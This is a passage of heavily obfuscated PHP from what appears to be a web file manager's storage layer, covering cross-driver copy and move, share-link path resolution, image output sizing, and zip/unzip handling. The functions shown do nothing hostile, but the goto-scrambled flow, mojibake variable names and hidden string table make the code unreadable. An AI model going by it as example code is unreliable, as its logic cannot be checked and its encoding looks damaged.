$eº‡‡³œÉ´) { $FÖÕªæÚùÙ->remove($a‰ËïÕ‚÷ä); } goto dã°Úßâ†; a Ç…˜  : $DÉïŒ‘ö¹¾ =& $_SERVER[¯Ò¬Èè]; if (!$a‰ËïÕ‚÷ä || $a‰ËïÕ‚÷ä == $DÉïŒ‘ö¹¾[8] || !$DÙ‘³ß¨) { return !1; } ignore_timeout(); goto D´Í››ò±÷; dã°Úßâ†: if ($bÓê‰‘ÂÎ) { $Bæ‘ğš—Ğ = $bÓê‰‘ÂÎ->getPathOuter($Bæ‘ğš—Ğ); } return $Bæ‘ğš—Ğ; goto cêİ­©†õ¢; DòÅªä¢: $bÓê‰‘ÂÎ = !1; if ($a¼¬–ò•¦™->pathParse[$DÉïŒ‘ö¹¾[1007]]) { $DÙ‘³ß¨ = $a¼¬–ò•¦™->pathParse[$DÉïŒ‘ö¹¾[1007]]; $bÓê‰‘ÂÎ = $a¼¬–ò•¦™; $a¼¬–ò•¦™ = self::driverMake($DÙ‘³ß¨); } self::check($FÖÕªæÚùÙ, $a‰ËïÕ‚÷ä, $a¼¬–ò•¦™, $DÙ‘³ß¨); goto E‘Â£Î‰£ƒ; D´Í››ò±÷: $FÖÕªæÚùÙ = self::driverMake($a‰ËïÕ‚÷ä); $a¼¬–ò•¦™ = self::driverMake($DÙ‘³ß¨); $eº‡‡³œÉ´ = $AÇÈìùãŒª == $DÉïŒ‘ö¹¾[501]; goto DòÅªä¢; cêİ­©†õ¢: } private static function check($Dîƒ›„¬ÏŠ, $D‘ó²»†‡é, $BŒ“é¢À´ê, &$eÅ¼ô‘¾ùŞ) { $c‘±É¹–ÁÑ =& $_SERVER[¯Ò¬Èè]; if (self::driverIsSame($Dîƒ›„¬ÏŠ, $BŒ“é¢À´ê) && $Dîƒ›„¬ÏŠ->isFolder($D‘ó²»†‡é) && $Dîƒ›„¬ÏŠ->isParentOf($D‘ó²»†‡é, $eÅ¼ô‘¾ùŞ)) { show_json(LNG($c‘±É¹–ÁÑ[1009]), !1); } if (!$Dîƒ›„¬ÏŠ->exist($D‘ó²»†‡é)) { show_json(LNG($c‘±É¹–ÁÑ[101]), !1); } } private static function copyPath($B µ„ôæ‘â, $b¬¢¤ò¶ö, $b‰ìÖ—ÑŞ, $Eğ¸„à’åÇ, $dÂĞ¸«Ã‚, $fé‰ùÆ‰Ú¸, $a½‰‰ˆ¶ß’, $A±ãËšÊ = false) { goto B»±…áË¨ñ; bš‹…ŒÕ­Â: $a‘èÇ¨èØ = $b‰ìÖ—ÑŞ->mkdir($b‰ìÖ—ÑŞ->getPath($eã×æ‰àØ)); $Eğ¸„à’åÇ = $b‰ìÖ—ÑŞ->getPathInner($a‘èÇ¨èØ); $E´Âì¼ŒÚ = $B µ„ôæ‘â->listPath($b¬¢¤ò¶ö, !0); goto eöâ›Ë¦; eöâ›Ë¦: $B¶Œî²ÈòÃ = array_merge($E´Âì¼ŒÚ[$d‹¸¤è—[73]], $E´Âì¼ŒÚ[$d‹¸¤è—[74]]); foreach ($B¶Œî²ÈòÃ as $AÓËõŒï«±) { $bçî³‹½íµ = $AÓËõŒï«±[$d‹¸¤è—[29]] == $d‹¸¤è—[167]; $b¬¢¤ò¶ö = $B µ„ôæ‘â->getPathInner($AÓËõŒï«±[$d‹¸¤è—[75]]); $Dã«–ºŒç¶ = self::copyPath($B µ„ôæ‘â, $b¬¢¤ò¶ö, $b‰ìÖ—ÑŞ, $Eğ¸„à’åÇ, $dÂĞ¸«Ã‚, $fé‰ùÆ‰Ú¸, $bçî³‹½íµ); if (!$Dã«–ºŒç¶) { write_log($d‹¸¤è—[1010] . $b¬¢¤ò¶ö . $d‹¸¤è—[1011] . $Eğ¸„à’åÇ, $d‹¸¤è—[1012]); } } return $a‘èÇ¨èØ; goto fÈ©‰ ›³Ö; A¹ÆÅÃ“£®: if ($a½‰‰ˆ¶ß’) { return self::copyFile($B µ„ôæ‘â, $b¬¢¤ò¶ö, $b‰ìÖ—ÑŞ, $Eğ¸„à’åÇ, $Eø×‹ÄÍº•, $fé‰ùÆ‰Ú¸); } if ($dÂĞ¸«Ã‚ == REPEAT_RENAME_FOLDER) { $dÂĞ¸«Ã‚ = !1; } $eã×æ‰àØ = rtrim($Eğ¸„à’åÇ, $d‹¸¤è—[8]) . $d‹¸¤è—[8] . $Eø×‹ÄÍº•; goto bš‹…ŒÕ­Â; B»±…áË¨ñ: $d‹¸¤è— =& $_SERVER[¯Ò¬Èè]; $Eø×‹ÄÍº• = $A±ãËšÊ ? $A±ãËšÊ : $B µ„ôæ‘â->getPathName($B µ„ôæ‘â->pathThis($b¬¢¤ò¶ö)); if ($dÂĞ¸«Ã‚) { $BÜÈá‰¡éì = $b‰ìÖ—ÑŞ->fileNameExist($Eğ¸„à’åÇ, $Eø×‹ÄÍº•); $Eø×‹ÄÍº• = $b‰ìÖ—ÑŞ->fileNameAuto($Eğ¸„à’åÇ, $Eø×‹ÄÍº•, $dÂĞ¸«Ã‚, !$a½‰‰ˆ¶ß’); $dÂĞ¸«Ã‚ = $BÜÈá‰¡éì ? $dÂĞ¸«Ã‚ : !1; } goto A¹ÆÅÃ“£®; fÈ©‰ ›³Ö: } private static function copyFile($D¨‰¡…ÄíÑ, $f„â°÷ó, $A±š°áÕ¿‡, $aÕÖ£µÆ™ø, $F×İ»¯¬ã², $c¥¤ŒØÌî) { goto c³º¤ËßÎ; d‰ÚîæÎä: mk_dir($bİçíñÛ“); $dæ…®ò¥¢ = $bİçíñÛ“ . $E‡í–ƒÔÒ‘; $dæ…®ò¥¢ = $D¨‰¡…ÄíÑ->download($f„â°÷ó, $dæ…®ò¥¢); goto B¨ñ°»’„˜; B¨ñ°»’„˜: $dæ…®ò¥¢ = $D¨‰¡…ÄíÑ->iconvApp($dæ…®ò¥¢); $bÂØÀøÄÙË = $A±š°áÕ¿‡->upload($aÕÖ£µÆ™ø, $dæ…®ò¥¢, $c¥¤ŒØÌî); self::remove($bİçíñÛ“ . $E‡í–ƒÔÒ‘); goto d„”Ú‚×Ï; d„”Ú‚×Ï: Hook::trigger($E‹×ÁË­ò¶[1015], $D¨‰¡…ÄíÑ, $f„â°÷ó, $A±š°áÕ¿‡, $aÕÖ£µÆ™ø, $F×İ»¯¬ã², $bÂØÀøÄÙË); return $bÂØÀøÄÙË; goto e½…Ã‚â®ã; c³º¤ËßÎ: $E‹×ÁË­ò¶ =& $_SERVER[¯Ò¬Èè]; $aÕÖ£µÆ™ø = $A±š°áÕ¿‡->getPath(rtrim($aÕÖ£µÆ™ø, $E‹×ÁË­ò¶[8]) . $E‹×ÁË­ò¶[8] . $F×İ»¯¬ã²); $E‡í–ƒÔÒ‘ = $E‹×ÁË­ò¶[1013] . time() . rand_string(5); goto aÛÑ­§‚Áî; aÛÑ­§‚Áî: Hook::trigger($E‹×ÁË­ò¶[1014], $D¨‰¡…ÄíÑ, $f„â°÷ó, $A±š°áÕ¿‡, $aÕÖ£µÆ™ø, $F×İ»¯¬ã², $E‡í–ƒÔÒ‘); if (self::driverIsSame($D¨‰¡…ÄíÑ, $A±š°áÕ¿‡)) { if ($c¥¤ŒØÌî) { $bÂØÀøÄÙË = $A±š°áÕ¿‡->moveFile($f„â°÷ó, $aÕÖ£µÆ™ø); } else { $bÂØÀøÄÙË = $A±š°áÕ¿‡->copyFile($f„â°÷ó, $aÕÖ£µÆ™ø); } Hook::trigger($E‹×ÁË­ò¶[1015], $D¨‰¡…ÄíÑ, $f„â°÷ó, $A±š°áÕ¿‡, $aÕÖ£µÆ™ø, $F×İ»¯¬ã², $bÂØÀøÄÙË); return $bÂØÀøÄÙË; } $bİçíñÛ“ = TEMP_FILES; goto d‰ÚîæÎä; e½…Ã‚â®ã: } public static function pathFather($Dİ©¯»¨·±) { $cË‘Õ”¥™ = IO::init($Dİ©¯»¨·±); $D÷ãƒÒ³ëå = $cË‘Õ”¥™->pathFather($cË‘Õ”¥™->path); return $cË‘Õ”¥™->getPathOuter($D÷ãƒÒ³ëå); } public static function fileOut($fîŒ•¾ôÕØ, $dÉ í£‘’Ş = false, $E•»Ôµˆ†Œ = false, $d¸šœÌ©é‘ = '') { $eõ¦œÊ»â’ = self::driverMake($fîŒ•¾ôÕØ); if ($eõ¦œÊ»â’->isFileOutServer()) { return $eõ¦œÊ»â’->fileOutServer($fîŒ•¾ôÕØ, $dÉ í£‘’Ş, $E•»Ôµˆ†Œ, $d¸šœÌ©é‘); } return $eõ¦œÊ»â’->fileOut($fîŒ•¾ôÕØ, $dÉ í£‘’Ş, $E•»Ôµˆ†Œ, $d¸šœÌ©é‘); } public static function fileOutImage($bß‚Ê´£¶Ú, $C¯´´¤ˆäº = 250) { $F”šŒãßù = array(250, 600, 1200, 3000); for ($bÅÙõŒêñ = 0; $bÅÙõŒêñ < count($F”šŒãßù); $bÅÙõŒêñ++) { if ($bÅÙõŒêñ == 0 && $C¯´´¤ˆäº <= $F”šŒãßù[$bÅÙõŒêñ]) { $C¯´´¤ˆäº = $F”šŒãßù[$bÅÙõŒêñ]; break; } else { if ($C¯´´¤ˆäº > $F”šŒãßù[$bÅÙõŒêñ - 1] && $C¯´´¤ˆäº <= $F”šŒãßù[$bÅÙõŒêñ]) { $C¯´´¤ˆäº = $F”šŒãßù[$bÅÙõŒêñ]; break; } else { if ($bÅÙõŒêñ == count($F”šŒãßù) - 1 && $C¯´´¤ˆäº > $F”šŒãßù[$bÅÙõŒêñ]) { $C¯´´¤ˆäº = $F”šŒãßù[$bÅÙõŒêñ]; break; } } } } $BºÚù™¾è£ = self::driverMake($bß‚Ê´£¶Ú); if ($BºÚù™¾è£->isFileOutServer()) { return $BºÚù™¾è£->fileOutImageServer($bß‚Ê´£¶Ú, $C¯´´¤ˆäº); } return $BºÚù™¾è£->fileOutImage($bß‚Ê´£¶Ú, $C¯´´¤ˆäº); } private static function driverIsSame($a¢Ãâ£³ÊÇ, $Dó†ØŒğÇÛ) { goto Eî¸éÁòöÈ; cÀïå„ö“: if ($a¢Ãâ£³ÊÇ->pathDriver == $Dó†ØŒğÇÛ->pathDriver) { return !0; } return !1; goto fõ„šß©Ç’; B‡µí´Ü£â: if ($BÎéÜ¡‡ != $B½Î›¤ø ¤) { return !1; } if ($BÎéÜ¡‡ == $cğÅ³ÖÊï[708]) { return !0; } if ($BÎéÜ¡‡ == $cğÅ³ÖÊï[102]) { return !0; } goto cÀïå„ö“; Eî¸éÁòöÈ: $cğÅ³ÖÊï =& $_SERVER[¯Ò¬Èè]; $BÎéÜ¡‡ = $a¢Ãâ£³ÊÇ->getType(); $B½Î›¤ø ¤ = $Dó†ØŒğÇÛ->getType(); goto B‡µí´Ü£â; fõ„šß©Ç’: } public static function copyUpdate($d¡óÒË¶“”, $F±Å’‡ç˜Ş) { goto FÍïõÉ“š; bÉá±…äŸ¿: $E†ƒ²¢£öŸ = self::_listAll($d¡óÒË¶“”); $Fø¤äÈ‰åÈ = self::_listAll($F±Å’‡ç˜Ş); $B„Ğ­««“Ø = array(); goto e¡œ¶õÆîÂ; Eì¶‹³Š¡Ã: Hook::trigger($AĞªó÷·«ï[1019], $d¡óÒË¶“”, $F±Å’‡ç˜Ş, $fìçì£µµª); foreach ($A¦“ˆòºÌ as $CŒÇŸó«Ê) { IO::mkdir($CŒÇŸó«Ê); } foreach ($B„Ğ­««“Ø as $CŒÇŸó«Ê) { IO::copy($CŒÇŸó«Ê[$AĞªó÷·«ï[1016]], $CŒÇŸó«Ê[$AĞªó÷·«ï[1017]], REPEAT_REPLACE); } goto c¾àÚ¸À´; e¡œ¶õÆîÂ: $A¦“ˆòºÌ = array(); foreach ($E†ƒ²¢£öŸ as $bŠÏÊÛè› => $CŒÇŸó«Ê) { if (isset($Fø¤äÈ‰åÈ[$bŠÏÊÛè›])) { if ($CŒÇŸó«Ê[$AĞªó÷·«ï[76]] == 1) { continue; } if ($Fø¤äÈ‰åÈ[$bŠÏÊÛè›][$AĞªó÷·«ï[77]] == $CŒÇŸó«Ê[$AĞªó÷·«ï[77]]) { continue; } } if ($CŒÇŸó«Ê[$AĞªó÷·«ï[76]] == 1) { $A¦“ˆòºÌ[] = $F±Å’‡ç˜Ş . $AĞªó÷·«ï[8] . $bŠÏÊÛè›; continue; } $EÚ°ôà´Ó§ = strstr(trim($bŠÏÊÛè›, $AĞªó÷·«ï[8]), $AĞªó÷·«ï[8]) ? get_path_father($bŠÏÊÛè›) : $AĞªó÷·«ï[33]; $B„Ğ­««“Ø[] = array($AĞªó÷·«ï[1016] => $CŒÇŸó«Ê[$AĞªó÷·«ï[75]], $AĞªó÷·«ï[1017] => rtrim($F±Å’‡ç˜Ş, $AĞªó÷·«ï[8]) . $AĞªó÷·«ï[8] . $EÚ°ôà´Ó§, $AĞªó÷·«ï[1018] => $CŒÇŸó«Ê); } $fìçì£µµª = array($AĞªó÷·«ï[167] => $B„Ğ­««“Ø, $AĞªó÷·«ï[76] => $A¦“ˆòºÌ); goto Eì¶‹³Š¡Ã; FÍïõÉ“š: $AĞªó÷·«ï =& $_SERVER[¯Ò¬Èè]; if (!IO::exist($d¡óÒË¶“”)) { return !1; } if (!IO::exist($F±Å’‡ç˜Ş)) { IO::mkdir($F±Å’‡ç˜Ş); } goto bÉá±…äŸ¿; c¾àÚ¸À´: } private static function _listAll($a­˜ğ¢Æ¼¥) { $F‰ç«Åˆ® =& $_SERVER[¯Ò¬Èè]; $a­˜ğ¢Æ¼¥ = KodIO::clear($a­˜ğ¢Æ¼¥); $B•Ï‚—Ñà = IO::listAll($a­˜ğ¢Æ¼¥); foreach ($B•Ï‚—Ñà as &$DéÀ‰òÆƒœ) { $D¢÷Ñ¿«¤¿ = substr($DéÀ‰òÆƒœ[$F‰ç«Åˆ®[75]], strlen($a­˜ğ¢Æ¼¥)); $DéÀ‰òÆƒœ[$F‰ç«Åˆ®[1020]] = trim($D¢÷Ñ¿«¤¿, $F‰ç«Åˆ®[8]); } return array_to_keyvalue($B•Ï‚—Ñà, $F‰ç«Åˆ®[1020]); } public static function fileSubstr($C’­èè¸´æ, $Dë¶•ó±»â, $CäŞŠ·ôìØ = false) { goto a¾™÷¨Ğ”Ç; bêÖ©æÈ„Ñ: $f‹¿Œç·ò¬ = $CäŞŠ·ôìØ; if ($Dë¶•ó±»â < 0) { $Dë¶•ó±»â = $c”— © Í£ + $Dë¶•ó±»â; } if ($CäŞŠ·ôìØ === !1) { $CäŞŠ·ôìØ = $c”— © Í£ - $Dë¶•ó±»â; } goto b¹Œïäéù—; AÉ„‚ªîÊ: return $F±åÑŸ¡³ã->fileSubstr($C’­èè¸´æ, $Dë¶•ó±»â, $CäŞŠ·ôìØ); goto DŸŒ¾Æ‹´Ê; a¾™÷¨Ğ”Ç: $F±åÑŸ¡³ã = self::driverMake($C’­èè¸´æ); $c”— © Í£ = $F±åÑŸ¡³ã->size($C’­èè¸´æ); $f’¹ÉÙÕø¢ = $Dë¶•ó±»â; goto bêÖ©æÈ„Ñ; b¹Œïäéù—: if ($Dë¶•ó±»â + $CäŞŠ·ôìØ > $c”— © Í£) { $CäŞŠ·ôìØ = $c”— © Í£ - $Dë¶•ó±»â; } if ($CäŞŠ·ôìØ <= 0) { return $_SERVER[¯Ò¬Èè][33]; } if ($Dë¶•ó±»â < 0 || $Dë¶•ó±»â >= $c”— © Í£ || $CäŞŠ·ôìØ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\145\122\x65\141\x64\40\x65\x72\162\x6f\162\41\x20\163\164\x61\162\164\x3d{$Dë¶•ó±»â}\73\154\x65\x6e\147\164\150\x3d{$CäŞŠ·ôìØ}\x3b\40\163\151\x7a\x65\x3d{$c”— © Í£}\73"); } goto AÉ„‚ªîÊ; DŸŒ¾Æ‹´Ê: } private static function driverMake(&$dõïö˜šš) { goto dğ¡³²Á‚; dğ¡³²Á‚: $c³çÂÂ¹Â =& $_SERVER[¯Ò¬Èè]; $bˆİÀÓ“ãï = KodIO::parse($dõïö˜šš); if (!self::$driverListSystem) { $eŒİ¢•ê•‚ = Model($c³çÂÂ¹Â[718])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eŒİ¢•ê•‚, $c³çÂÂ¹Â[367]); } goto e™‹Çä£ø´; C’·Åßå£É: return $f…Ï„ñ˜©; goto f‡ô‰‰©Üã; e™‹Çä£ø´: if ($bˆİÀÓ“ãï[$c³çÂÂ¹Â[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bˆİÀÓ“ãï[$c³çÂÂ¹Â[367]]]) { return !1; } $dõïö˜šš = $bˆİÀÓ“ãï[$c³çÂÂ¹Â[1021]]; $f…Ï„ñ˜© = self::driverGet($bˆİÀÓ“ãï, $dõïö˜šš); goto C’·Åßå£É; f‡ô‰‰©Üã: } private static function driverGet($EÑµ²¢êÁŸ, &$Eßß¬Ú¶®«) { goto dÙœÖ‡Ÿë¤; d¥…êêÍøà: $e—ÂÙ­Á¡ª = self::$driverCache[$B¾ª±Á¬ß]; $e—ÂÙ­Á¡ª->pathDriver = $eè´î­Ù; $e—ÂÙ­Á¡ª->pathBase = $dŠÌÜ•‹ğ±[33]; goto eÀš´ùÛÎ; AÎå²Î†À: switch ($EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[29]]) { case KodIO::KOD_IO: $e²Š²Ó³Æ« = self::$driverListSystem[$E’å‡È‚—]; break; case KodIO::KOD_SOURCE: $Eßß¬Ú¶®« = $E’å‡È‚— . $Eßß¬Ú¶®«; $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1024], $dŠÌÜ•‹ğ±[6] => $EÑµ²¢êÁŸ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $f¾šÃš²šã = $GLOBALS[$dŠÌÜ•‹ğ±[1025]]; self::$driverListUser = array_to_keyvalue($f¾šÃš²šã, $dŠÌÜ•‹ğ±[367]); } $e²Š²Ó³Æ« = self::$driverListUser[$E’å‡È‚—]; break; case KodIO::KOD_SHARE_LINK: $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1026], $dŠÌÜ•‹ğ±[6] => $EÑµ²¢êÁŸ); $a²Õ·‰¶ = Action($dŠÌÜ•‹ğ±[1027])->sharePathInfo($EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[75]]); $Eßß¬Ú¶®« = $a²Õ·‰¶[$dŠÌÜ•‹ğ±[369]]; if (!$a²Õ·‰¶[$dŠÌÜ•‹ğ±[369]]) { $Dİ„¬İ = Model($dŠÌÜ•‹ğ±[545])->getInfo($a²Õ·‰¶[$dŠÌÜ•‹ğ±[441]]); $Eßß¬Ú¶®« = KodIO::clear($Dİ„¬İ[$dŠÌÜ•‹ğ±[1028]] . $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1021]]); $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[439]] = $Dİ„¬İ; $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1007]] = $Eßß¬Ú¶®«; $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1029], $dŠÌÜ•‹ğ±[6] => $EÑµ²¢êÁŸ); } break; case KodIO::KOD_SHARE_ITEM: $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1030], $dŠÌÜ•‹ğ±[6] => $EÑµ²¢êÁŸ); $Dİ„¬İ = Model($dŠÌÜ•‹ğ±[545])->getInfo($EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[367]]); if ($Dİ„¬İ[$dŠÌÜ•‹ğ±[369]] == $dŠÌÜ•‹ğ±[468]) { $Eßß¬Ú¶®« = KodIO::clear($Dİ„¬İ[$dŠÌÜ•‹ğ±[1028]] . $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1021]]); $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[439]] = $Dİ„¬İ; $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1007]] = $Eßß¬Ú¶®«; $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1031], $dŠÌÜ•‹ğ±[6] => $EÑµ²¢êÁŸ); } else { if (!$Eßß¬Ú¶®«) { $Eßß¬Ú¶®« = $Dİ„¬İ[$dŠÌÜ•‹ğ±[369]]; } } break; default: $Eßß¬Ú¶®« = $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[75]]; $e²Š²Ó³Æ« = array($dŠÌÜ•‹ğ±[1023] => $dŠÌÜ•‹ğ±[1032]); break; } $B¾ª±Á¬ß = $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[75]]; if (!isset(self::$driverCache[$B¾ª±Á¬ß])) { $D•óõÇæê° = strtolower($e²Š²Ó³Æ«[$dŠÌÜ•‹ğ±[90]]); $D–İ…ÙÖœ = $GLOBALS[$dŠÌÜ•‹ğ±[6]][$dŠÌÜ•‹ğ±[84]][$dŠÌÜ•‹ğ±[768]]; $bØÎÕÏ˜ˆ = $dŠÌÜ•‹ğ±[71] . (isset($D–İ…ÙÖœ[$D•óõÇæê°]) ? $D–İ…ÙÖœ[$D•óõÇæê°] : ucfirst($D•óõÇæê°)); if (!class_exists($bØÎÕÏ˜ˆ)) { show_json("{$bØÎÕÏ˜ˆ}\x20\x6e\x6f\x74\x20\x65\170\151\x73\164\163\41", !1); } $bé»âĞŸ¼Ş = isset($e²Š²Ó³Æ«[$dŠÌÜ•‹ğ±[6]]) ? $e²Š²Ó³Æ«[$dŠÌÜ•‹ğ±[6]] : !1; self::$driverCache[$B¾ª±Á¬ß] = new $bØÎÕÏ˜ˆ($bé»âĞŸ¼Ş); } goto d¥…êêÍøà; dàˆãáçå: $e—ÂÙ­Á¡ª->path = $Eßß¬Ú¶®«; return $e—ÂÙ­Á¡ª; goto F–Œòß­ñ; eÀš´ùÛÎ: if (isset($e²Š²Ó³Æ«[$dŠÌÜ•‹ğ±[6]][$dŠÌÜ•‹ğ±[1033]])) { $e—ÂÙ­Á¡ª->pathBase = rtrim($e²Š²Ó³Æ«[$dŠÌÜ•‹ğ±[6]][$dŠÌÜ•‹ğ±[1033]], $dŠÌÜ•‹ğ±[8]) . $dŠÌÜ•‹ğ±[8]; $Eßß¬Ú¶®« = $e—ÂÙ­Á¡ª->pathBase . ltrim($Eßß¬Ú¶®«, $dŠÌÜ•‹ğ±[8]); } $Eßß¬Ú¶®« = $e—ÂÙ­Á¡ª->getPath($Eßß¬Ú¶®«); if (isset($EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1007]])) { $Eßß¬Ú¶®« = $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1007]]; } goto dàˆãáçå; dÙœÖ‡Ÿë¤: $dŠÌÜ•‹ğ± =& $_SERVER[¯Ò¬Èè]; $eè´î­Ù = $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[1022]]; $E’å‡È‚— = $EÑµ²¢êÁŸ[$dŠÌÜ•‹ğ±[367]]; goto AÎå²Î†À; F–Œòß­ñ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $A±ƒ¢åİå ; if (!$A±ƒ¢åİå ) { $d®ªê»´å† = IO::init($_SERVER[¯Ò¬Èè][8]); } return $d®ªê»´å†; } private static function iconvSystem($f¸ì§‡­µ‹) { return self::local()->iconvSystem($f¸ì§‡­µ‹); } private static function iconvApp($b–Şˆ¿‘·) { return self::local()->iconvApp($b–Şˆ¿‘·); } public static function zip($aÊ¢¡°£†, $BøÚïĞ‹è  = "\172\x69\160", $Eé˜ïô˜“¯ = '', $DŒæ¸˜Âˆ¨ = REPEAT_RENAME) { goto aêàÈÏ‘»ù; c£Ôì×®ˆá: $Aæ †‡Ûï = $BİÌ‘ò¤Ö . $D¿ÕˆÀØŠ… . $d¤ô×Ûæ“Ú[91] . $BøÚïĞ‹è ; $Aæ †‡Ûï = get_filename_auto($Aæ †‡Ûï, $d¤ô×Ûæ“Ú[33], $DŒæ¸˜Âˆ¨); $aâä®ßí¹ = self::iconvSystem($Aæ †‡Ûï); goto dĞÃª‡Ò«; dóÛÄÏ¹°’: $C»›é¦áÈ‹ = !1; if (!$Eé˜ïô˜“¯ && $EêÄ´ÌÙŒ->getType() == $d¤ô×Ûæ“Ú[102]) { $A­¸½ÙÙ± = self::zipFileList($aÊ¢¡°£†); } else { $C»›é¦áÈ‹ = $Eé˜ïô˜“¯ ? $Eé˜ïô˜“¯ : TEMP_FILES . $d¤ô×Ûæ“Ú[1034] . time() . rand_string(8) . $d¤ô×Ûæ“Ú[8]; mk_dir($C»›é¦áÈ‹); $A­¸½ÙÙ± = self::zipFileList($aÊ¢¡°£†, $C»›é¦áÈ‹); } $D¿ÕˆÀØŠ… = $Cá®¡ÎŒ·“[$d¤ô×Ûæ“Ú[28]]; goto BÏŠêÛ‡“Ò; cİ¿Å‡ŒÔ˜: if ($Eé˜ïô˜“¯ || !$C»›é¦áÈ‹) { if ($C»›é¦áÈ‹ && strstr($C»›é¦áÈ‹, TEMP_FILES)) { $F©ªÖŸ¢§Ã = $A­¸½ÙÙ± = array(); recursion_dir($BİÌ‘ò¤Ö, $F©ªÖŸ¢§Ã, $A­¸½ÙÙ±, 0); foreach ($F©ªÖŸ¢§Ã as $f‰òçÔ‘Ñ”) { del_dir($f‰òçÔ‘Ñ”); } foreach ($A­¸½ÙÙ± as $e¯Õ‡•›§) { if ($e¯Õ‡•›§ == $aâä®ßí¹) { continue; } del_file($e¯Õ‡•›§); } } return $Aæ †‡Ûï; } $føÑ‚¹½ = self::pathFather($Cá®¡ÎŒ·“[$d¤ô×Ûæ“Ú[75]]); $Dƒ¡ø½ßƒ‚ = self::move($Aæ †‡Ûï, $føÑ‚¹½, $DŒæ¸˜Âˆ¨); goto fÔ¬‹È°·º; fÔ¬‹È°·º: if (!$Dƒ¡ø½ßƒ‚) { del_dir($C»›é¦áÈ‹); show_json(LNG($d¤ô×Ûæ“Ú[1036]), !1); } del_dir($C»›é¦áÈ‹); return $Dƒ¡ø½ßƒ‚; goto fŠñ»×ºÀå; BÏŠêÛ‡“Ò: if (count($A­¸½ÙÙ±) > 1) { $CÄáíá˜Ùí = IO::info(IO::pathFather($Cá®¡ÎŒ·“[$d¤ô×Ûæ“Ú[75]])); $D¿ÕˆÀØŠ… = $CÄáíá˜Ùí[$d¤ô×Ûæ“Ú[28]]; } $BİÌ‘ò¤Ö = $C»›é¦áÈ‹; if (!$BİÌ‘ò¤Ö) { $BİÌ‘ò¤Ö = get_path_father($Cá®¡ÎŒ·“[$d¤ô×Ûæ“Ú[75]]); $f—“”ù¸• = IO::info($BİÌ‘ò¤Ö); if (!$f—“”ù¸•[$d¤ô×Ûæ“Ú[189]]) { show_json(LNG($d¤ô×Ûæ“Ú[1035]), !1); } } goto c£Ôì×®ˆá; aêàÈÏ‘»ù: $d¤ô×Ûæ“Ú =& $_SERVER[¯Ò¬Èè]; $EêÄ´ÌÙŒ = self::init($aÊ¢¡°£†[0][$d¤ô×Ûæ“Ú[75]]); $Cá®¡ÎŒ·“ = self::info($aÊ¢¡°£†[0][$d¤ô×Ûæ“Ú[75]]); goto dóÛÄÏ¹°’; dĞÃª‡Ò«: foreach ($A­¸½ÙÙ± as $CŠµŠ§‚ÆÚ => $F•›™¯ò®÷) { $A­¸½ÙÙ±[$CŠµŠ§‚ÆÚ] = self::iconvSystem($F•›™¯ò®÷); } KodArchive::create($aâä®ßí¹, $A­¸½ÙÙ±); if (!IO::exist($Aæ †‡Ûï)) { if ($C»›é¦áÈ‹) { del_dir($C»›é¦áÈ‹); } show_json(LNG($d¤ô×Ûæ“Ú[1036]), !1); } goto cİ¿Å‡ŒÔ˜; fŠñ»×ºÀå: } public static function unzip($FŸšÊçÓŒæ, $díÄÜâç‘§ = "\x72\145\160\154\141\143\145") { goto B¦ïø‹å½Ş; DÅ‡‹öÆèë: foreach ($aõ¢²¤²£ as $E‡µ¶¤˜»Û) { $E‡µ¶¤˜»Û = self::iconvApp($E‡µ¶¤˜»Û); self::move($E‡µ¶¤˜»Û, $eÎ­áêà¸š, $díÄÜâç‘§); } del_dir($AöÃ«â° ²); if (!$Fš‚¾´‘ò×) { del_file($FÅé¦ï“á…); } goto eÊĞà§—„½; eèá¬ç½Ô: if (!@file_exists(self::iconvSystem($FÅé¦ï“á…))) { $Fš‚¾´‘ò× = self::localFilePath($bØÂ¯ñï…, $BŒéŞ¥µîÖ); $FÅé¦ï“á… = $Fš‚¾´‘ò× ? $Fš‚¾´‘ò× : parent::download($bØÂ¯ñï…, $FÅé¦ï“á…); } $FÅé¦ï“á… = self::iconvSystem($FÅé¦ï“á…); $a‡ÉëùÙõ = isset($FŸšÊçÓŒæ[$D –ÑËğÖ’[1039]]) ? $FŸšÊçÓŒæ[$D –ÑËğÖ’[1039]] : $D –ÑËğÖ’[1040]; goto fÅ†Ë‘©÷Ğ; C™œ›‡…¨„: $Eêñ±ĞŸ = self::tmpFileName($Eæ©Ñ©); $AöÃ«â° ² = TEMP_FILES . $Eêñ±ĞŸ; del_dir($AöÃ«â° ²); goto DØ¶µ½ê Ó; eÊĞà§—„½: return !0; goto D¨ÃÛëÜ¦¡; B¦ïø‹å½Ş: $D –ÑËğÖ’ =& $_SERVER[¯Ò¬Èè]; $bØÂ¯ñï… = $FŸšÊçÓŒæ[$D –ÑËğÖ’[75]]; $eÎ­áêà¸š = $FŸšÊçÓŒæ[$D –ÑËğÖ’[1037]]; goto cË¥æ¼ˆÓ‰; cË¥æ¼ˆÓ‰: if (!($Eæ©Ñ© = parent::info($bØÂ¯ñï…))) { show_json(LNG($D –ÑËğÖ’[1038]), 